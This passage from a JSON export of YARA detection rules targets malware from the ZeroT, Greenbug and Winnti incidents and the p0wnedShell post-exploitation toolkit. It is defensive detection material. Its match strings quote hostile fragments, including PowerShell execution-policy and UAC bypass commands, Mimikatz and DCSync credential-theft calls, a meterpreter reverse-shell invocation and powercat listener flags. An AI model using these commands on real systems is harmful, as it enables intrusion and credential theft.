0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-02-03 10:03:51","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_1_RID2CC8","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"3c16bb1ee78537806593f1d726ecf845","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_2_RID2CC9 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NO2-2016101902.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-02-03 10:04:01","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_2_RID2CC9","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"22bb723f64a52be1d67c1d405818f962","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_3_RID2CCA : APT DEMO FILE T1223 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1223\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/svchost.exe\" fullword ascii\n      $s2 = \"RasTls.dll\" fullword ascii\n      $s3 = \"20160620.htm\" fullword ascii\n      $s4 = \"* $l&$\" fullword ascii\n      $s5 = \"dfjhmh\" fullword ascii\n      $s6 = \"/20160620.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them ) or ( all of them )\n}","date":"2017-02-03 10:04:11","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_3_RID2CCA","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"2560a8096724033686e67ee343cde409","score":75,"tags":["APT","DEMO","FILE","T1223"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_4_RID2CCB : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Mcutil.dll\" fullword ascii\n      $s2 = \"mcut.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-02-03 10:04:21","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_4_RID2CCB","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"cea0317a9ec70b8102b81f51963e0e83","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_5_RID2CCC : APT DEMO FILE T1223 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1223\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dbozcb\" fullword ascii\n      $s1 = \"nflogger.dll\" fullword ascii\n      $s2 = \"/svchost.exe\" fullword ascii\n      $s3 = \"1207.htm\" fullword ascii\n      $s4 = \"/1207.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 1 of ( $x* ) and 1 of ( $s* ) ) or ( all of them )\n}","date":"2017-02-03 10:04:31","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_5_RID2CCC","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"cfe5f435e3a6404aa94cb7ea0f2d763e","score":75,"tags":["APT","DEMO","FILE","T1223"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_7_RID2CCE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"RasTls.dll\" fullword ascii\n      $s2 = \"RasTls.exe\" fullword ascii\n      $s4 = \"LOADER ERROR\" fullword ascii\n      $s5 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-02-03 10:04:51","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_7_RID2CCE","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"96b2ef6ddaf95435369b722c2a7392d9","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_8_RID2CCF : APT DEMO FILE T1223 {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1223\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/svchost.exe\" fullword ascii\n      $s2 = \"RasTls.dll\" fullword ascii\n      $s3 = \"20160620.htm\" fullword ascii\n      $s4 = \"/20160620.htm\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5449 and filesize < 1000KB and 3 of them )\n}","date":"2017-02-03 10:05:01","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_8_RID2CCF","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"9f0df450381784fdca015009e2aac39d","score":75,"tags":["APT","DEMO","FILE","T1223"]},{"author":"Florian Roth","content":"rule PP_CN_APT_ZeroT_9_RID2CD0 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from the Proofpoint CN APT ZeroT incident\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx\"\n      date = \"2017-02-03 10:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"nflogger.dll\" fullword ascii\n      $s7 = \"Zlh.exe\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them )\n}","date":"2017-02-03 10:05:11","description":"Detects malware from the Proofpoint CN APT ZeroT incident","minimum_yara":"1.7","name":"PP_CN_APT_ZeroT_9_RID2CD0","reference":"https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx","required_modules":[],"rule_hash":"1adca49046647f85775cc08792fcdf08","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule GoogleBot_UserAgent_RID2E80 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects the GoogleBot UserAgent String in an Executable\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-01-27 11:17:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\" fullword ascii\n      $fp1 = \"McAfee, Inc.\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 and not 1 of ( $fp* ) )\n}","date":"2017-01-27 11:17:11","description":"Detects the GoogleBot UserAgent String in an Executable","minimum_yara":"1.7","name":"GoogleBot_UserAgent_RID2E80","reference":"Internal Research","required_modules":[],"rule_hash":"162919fdd9d00538d2c1eb00422ddc9a","score":65,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_1_RID2DF8 : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Malware from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25 10:54:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"vailablez\" fullword ascii\n      $s2 = \"Sfouglr\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-01-25 10:54:31","description":"Detects Malware from Greenbug Incident","minimum_yara":"1.7","name":"Greenbug_Malware_1_RID2DF8","reference":"https://goo.gl/urp4CD","required_modules":[],"rule_hash":"556615c892a2ef3f3de3618e53834268","score":75,"tags":["DEMO","EXE","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_3_RID2DFA : DEMO MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25 10:54:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"F:\\\\Projects\\\\Bot\\\\Bot\\\\Release\\\\Ism.pdb\" fullword ascii\n      $x2 = \"C:\\\\ddd\\\\wer2.txt\" fullword wide\n      $x3 = \"\\\\Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n   condition: \n      1 of them\n}","date":"2017-01-25 10:54:51","description":"Detects Backdoor from Greenbug Incident","minimum_yara":"1.7","name":"Greenbug_Malware_3_RID2DFA","reference":"https://goo.gl/urp4CD","required_modules":[],"rule_hash":"830d04460d0d17f59c98841f39ee2e80","score":75,"tags":["DEMO","MIDDLE_EAST","MAL"]},{"author":"Florian Roth","content":"rule Winnti_fonfig_RID2C62 : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Winnti sample - file fonfig.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/VbvJtL\"\n      date = \"2017-01-25 09:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mciqtz.exe\" fullword wide\n      $s2 = \"knat9y7m\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-01-25 09:46:51","description":"Winnti sample - file fonfig.exe","minimum_yara":"1.7","name":"Winnti_fonfig_RID2C62","reference":"https://goo.gl/VbvJtL","required_modules":[],"rule_hash":"3e8af97d002ec3396b31754762bc508d","score":75,"tags":["DEMO","EXE","CHINA","FILE","MAL"]},{"author":"Florian Roth","content":"rule Winnti_NlaifSvc_RID2CFF : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Winnti sample - file NlaifSvc.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/VbvJtL\"\n      date = \"2017-01-25 10:13:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cracked by ximo\" ascii\n      $s1 = \"Yqrfpk\" fullword ascii\n      $s2 = \"IVVTOC\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )\n}","date":"2017-01-25 10:13:01","description":"Winnti sample - file NlaifSvc.dll","minimum_yara":"1.7","name":"Winnti_NlaifSvc_RID2CFF","reference":"https://goo.gl/VbvJtL","required_modules":[],"rule_hash":"d907f81c64da800aa980444b8f2e2e33","score":75,"tags":["DEMO","EXE","CHINA","FILE","MAL"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_2_RID2DF9 : DEMO EXE FILE MAL MIDDLE_EAST T1047 {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25 10:54:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"|||Command executed successfully\" fullword ascii\n      $x2 = \"\\\\Release\\\\Bot Fresh.pdb\" ascii\n      $x3 = \"C:\\\\ddd\\\\a1.txt\" fullword wide\n      $x4 = \"Bots\\\\Bot5\\\\x64\\\\Release\" ascii\n      $x5 = \"Bot5\\\\Release\\\\Ism.pdb\" ascii\n      $x6 = \"Bot\\\\Release\\\\Ism.pdb\" ascii\n      $x7 = \"\\\\Bot Fresh\\\\Release\\\\Bot\" ascii\n      $s1 = \"/Home/SaveFile?commandId=CmdResult=\" fullword wide\n      $s2 = \"raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday\" fullword ascii\n      $s3 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n      $s4 = \"SELECT * FROM AntiVirusProduct\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 2 of them ) ) or ( 3 of them )\n}","date":"2017-01-25 10:54:41","description":"Detects Backdoor from Greenbug Incident","minimum_yara":"1.7","name":"Greenbug_Malware_2_RID2DF9","reference":"https://goo.gl/urp4CD","required_modules":[],"rule_hash":"0a529b1fdfe16b2e6f0b043239d71499","score":75,"tags":["T1047","MAL","DEMO","FILE","MIDDLE_EAST","EXE"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_4_RID2DFB : DEMO EXE FILE MAL MIDDLE_EAST {\n   meta:\n      description = \"Detects ISMDoor Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25 10:55:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell.exe -nologo -windowstyle hidden -c \\\"Set-ExecutionPolicy -scope currentuser\" fullword ascii\n      $s2 = \"powershell.exe -c \\\"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \\\"\" fullword ascii\n      $s3 = \"c:\\\\windows\\\\temp\\\\tmp8873\" fullword ascii\n      $s4 = \"taskkill /im winit.exe /f\" fullword ascii\n      $s5 = \"invoke-psuacme\" \n      $s6 = \"-method oobe -payload \\\"\\\"\" fullword ascii\n      $s7 = \"C:\\\\ProgramData\\\\stat2.dat\" fullword wide\n      $s8 = \"Invoke-bypassuac\" fullword ascii\n      $s9 = \"Start Keylog Done\" fullword wide\n      $s10 = \"Microsoft\\\\Windows\\\\WinIt.exe\" fullword ascii\n      $s11 = \"Microsoft\\\\Windows\\\\Tmp9932u1.bat\\\"\" fullword ascii\n      $s12 = \"Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )\n}","date":"2017-01-25 10:55:01","description":"Detects ISMDoor Backdoor","minimum_yara":"1.7","name":"Greenbug_Malware_4_RID2DFB","reference":"https://goo.gl/urp4CD","required_modules":[],"rule_hash":"f756b16a93dac0b7daa37c713582d2de","score":75,"tags":["DEMO","EXE","MIDDLE_EAST","FILE","MAL"]},{"author":"Florian Roth","content":"rule Greenbug_Malware_5_RID2DFC : DEMO EXE FILE MAL MIDDLE_EAST T1087 {\n   meta:\n      description = \"Detects Greenbug malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25 10:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1087\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd /u /c WMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter\" fullword ascii\n      $x2 = \"cmd /a /c net user administrator /domain >>\" fullword ascii\n      $x3 = \"cmd /a /c netstat -ant >>\\\"%localappdata%\\\\Microsoft\\\\\" fullword ascii\n      $o1 = \"========================== (Net User) ==========================\" ascii fullword\n   condition: \n      filesize < 2000KB and ( ( uint16 ( 0 ) == 0x5a4d and 1 of them ) or $o1 )\n}","date":"2017-01-25 10:55:11","description":"Detects Greenbug malware samples","minimum_yara":"1.7","name":"Greenbug_Malware_5_RID2DFC","reference":"https://goo.gl/urp4CD","required_modules":[],"rule_hash":"894631f4a2d9649d008f12449ccbbf7b","score":75,"tags":["T1087","MAL","DEMO","FILE","MIDDLE_EAST","EXE"]},{"author":"Florian Roth","content":"rule p0wnedPowerCat_RID2C84 : DEMO FILE HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat_RID2C84.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:52:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Now if we point Firefox to http://127.0.0.1\" fullword ascii\n      $x2 = \"powercat -l -v -p\" fullword ascii\n      $x3 = \"P0wnedListener\" fullword ascii\n      $x4 = \"EncodedPayload.bat\" fullword ascii\n      $x5 = \"powercat -c \" fullword ascii\n      $x6 = \"Program.P0wnedPath()\" ascii\n      $x7 = \"Invoke-PowerShellTcpOneLine\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x7375 and filesize < 150KB and 1 of them ) or ( 2 of them )\n}","date":"2017-01-14 09:52:31","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPowerCat.cs","minimum_yara":"1.7","name":"p0wnedPowerCat_RID2C84","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"7ace65a2eae32371ec8674528b460864","score":75,"tags":["DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Hacktool_Strings_p0wnedShell_RID3234 : DEMO HKTL T1055 {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShell.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 13:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1055\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-TokenManipulation\" fullword ascii\n      $x2 = \"windows/meterpreter\" fullword ascii\n      $x3 = \"lsadump::dcsync\" fullword ascii\n      $x4 = \"p0wnedShellx86\" fullword ascii\n      $x5 = \"p0wnedShellx64\" fullword ascii\n      $x6 = \"Invoke_PsExec()\" fullword ascii\n      $x7 = \"Invoke-Mimikatz\" fullword ascii\n      $x8 = \"Invoke_Shellcode()\" fullword ascii\n      $x9 = \"Invoke-ReflectivePEInjection\" ascii\n   condition: \n      1 of them\n}","date":"2017-01-14 13:55:11","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShell.cs","minimum_yara":"1.7","name":"Hacktool_Strings_p0wnedShell_RID3234","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"bb4a6e97b2e41ca757f1cfef53778bad","score":75,"tags":["T1055","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedPotato_RID2BD6 : DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato_RID2BD6.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:23:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke-Tater\" fullword ascii\n      $x2 = \"P0wnedListener.Execute(WPAD_Proxy);\" fullword ascii\n      $x3 = \" -SpooferIP \" ascii\n      $x4 = \"TaterCommand()\" ascii\n      $x5 = \"FileName = \\\"cmd.exe\\\",\" fullword ascii\n   condition: \n      1 of them\n}","date":"2017-01-14 09:23:31","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedPotato.cs","minimum_yara":"1.7","name":"p0wnedPotato_RID2BD6","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"ebc24781bc4666c2662100aeaae92870","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedExploits_RID2CB7 : DEMO HKTL T1033 {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits_RID2CB7.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 10:01:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1033\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Pshell.RunPSCommand(Whoami);\" fullword ascii\n      $x2 = \"If succeeded this exploit should popup a System CMD Shell\" fullword ascii\n   condition: \n      all of them\n}","date":"2017-01-14 10:01:01","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedExploits.cs","minimum_yara":"1.7","name":"p0wnedExploits_RID2CB7","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"542ccac3dd766fdee131837cd54834c7","score":75,"tags":["DEMO","T1033","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedShellx64_RID2C39 : DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64_RID2C39.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:40:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9Pjgb/+kPPhv9Sjp01Wf\" wide\n      $x2 = \"Invoke-TokenManipulation\" wide\n      $x3 = \"-CreateProcess \\\"cmd.exe\\\" -Username \\\"nt authority\\\\system\\\"\" fullword wide\n      $x4 = \"CommandShell with Local Administrator privileges :)\" fullword wide\n      $x5 = \"Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost \" fullword wide\n   condition: \n      1 of them\n}","date":"2017-01-14 09:40:01","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedShellx64.exe","minimum_yara":"1.7","name":"p0wnedShellx64_RID2C39","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"730f17f9e2a9688b3fd10a5e5ab53057","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedListenerConsole_RID2F78 : DEMO HKTL T1055 {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole_RID2F78.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 11:58:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1055\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Invoke_ReflectivePEInjection\" fullword wide\n      $x5 = \"p0wnedShell> \" fullword wide\n      $x6 = \"Resources.Get_PassHashes\" fullword wide\n      $s7 = \"Invoke_CredentialsPhish\" fullword wide\n      $s8 = \"Invoke_Shellcode\" fullword wide\n      $s9 = \"Resources.Invoke_TokenManipulation\" fullword wide\n      $s10 = \"Resources.Port_Scan\" fullword wide\n      $s20 = \"Invoke_PowerUp\" fullword wide\n   condition: \n      1 of them\n}","date":"2017-01-14 11:58:31","description":"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedListenerConsole.cs","minimum_yara":"1.7","name":"p0wnedListenerConsole_RID2F78","reference":"https://github.com/Cn33liz/p0wnedShell","required_modules":[],"rule_hash":"ddf9c4ff41035811a5f157ebad77a3b1","score":75,"tags":["T1055","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule p0wnedBinaries_RID2C8C : DEMO HKTL {\n   meta:\n      description = \"p0wnedShell Runspace Post Exploitation Toolkit - file p0wnedBinaries_RID2C8C.cs\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/p0wnedShell\"\n      date = \"2017-01-14 09:53:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Oq02AB+LCAAAAAAABADs/QkW3LiOLQBuRUsQR1H731gHMQOkFGFnvvrdp/O4sp6tkDiAIIjhAryu4z6PVOtxHuXz3/xT6X9za/Df/Hsa/JT/9\" ascii\n      $x2 = \"wpoWAB+LCAAAAAAABADs/QeyK7uOBYhORUNIenL+E2vBA0ympH3erY4f8Tte3TpbUiY9YRbcGK91vVKtr+tV3v/B/yr/m1vD/+DvNOVb+V/f\" ascii\n      $x3 = \"mo0MAB+LCAAAAAAABADsXQl24zqu3YqXII6i9r+xJ4AACU4SZcuJnVenf/9OxbHEAcRwcQGu62NbHsrax/Iw+3/hP5b+VzuH/4WfVeDf8n98\" ascii\n      $x4 = \"LE4CAB+LCAAAAAAABADsfQmW2zqu6Fa8BM7D/jf2hRmkKNuVm/Tt9zunkipb4giCIGb2/prhFUt5hVe+/sNP4b+pVvwPn+OQp/LT9ge/+\" ascii\n      $x5 = \"XpMCAB+LCAAAAAAABADsfQeWIzmO6FV0hKAn73+xL3iAwVAqq2t35r/tl53VyhCDFoQ3Y7zW9Uq1vq5Xef/CT+X/59bwFz6nKU/lp+8P/\" ascii\n      $x6 = \"STwAAB+LCAAAAAAABADtWwmy6yoO3YqXgJjZ/8ZaRwNgx/HNfX/o7qqUkxgzCM0SmLR2jHBQzkc4En9xZbvHUuSLMnWv9ateK/70ilStR\" ascii\n      $x7 